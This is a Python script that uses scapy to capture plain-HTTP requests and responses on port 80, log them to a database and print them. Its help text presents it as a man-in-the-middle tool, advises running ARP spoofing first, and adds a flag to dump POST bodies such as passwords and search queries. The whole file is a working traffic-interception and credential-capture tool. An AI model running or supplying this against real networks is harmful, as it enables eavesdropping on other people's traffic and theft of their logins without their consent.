from scapy.all import *
from scapy.layers.http import HTTPRequest ,HTTPResponse# import HTTP packet
from colorama import init, Fore
from db_orm import insert_request 
# initialize colorama
init()

# define colors
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET


def sniff_packets(iface=None):
    """
    Sniff 80 port packets with `iface`, if None (default), then the
    scapy's default interface is used
    """
    if iface:
        # port 80 for http (generally)
        # `process_packet` is the callback
        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
    else:
        # sniff with default interface
        sniff(filter="port 80", prn=process_packet, store=False)

reqnum = 0
resnum = 0
def process_packet(packet):
    global reqnum,resnum
    """
    This function is executed whenever a packet is sniffed
    """
    if packet.haslayer(HTTPRequest):
        # if this packet is an HTTP Request
        # get the requested URL
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        port = packet[TCP].sport
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        fields = packet[HTTPRequest].fields
        reqnum += 1
        host = packet[HTTPRequest].Host.decode()
        request_uri = packet[HTTPRequest].Path.decode()
        src_ip = packet[IP].src
        src_port = packet[TCP].sport
        dst_ip = packet[IP].dst
        dst_port = packet[TCP].dport
        first_line = method + " " + url
        insert_request(first_line,host,request_uri,src_ip,src_port,dst_ip,dst_port)
        print(f"\n{GREEN}[+] {reqnum} {ip}:{port} Requested {url} with {method}{RESET}")
        print(f"\n{GREEN}   {fields}")
        if show_raw and packet.haslayer(Raw) and method == "POST":
            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
            # then show raw
            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")

    if packet.haslayer(HTTPResponse):
        #response = dir(packet[HTTPResponse])
        version = packet[HTTPResponse].Http_Version.decode()
        server = packet[HTTPResponse].Server.decode()
        status = packet[HTTPResponse].Status_Code.decode()
        ip = packet[IP].dst
        port = packet[TCP].dport
        fields = packet[HTTPResponse].fields
        resnum += 1
        print(f"\n{RED}[+] {resnum} {ip}:{port} Response: {server} {version} -- {status}")
        print(f"\n{RED}   {fields}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")

    # parse arguments
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw

    sniff_packets(iface)
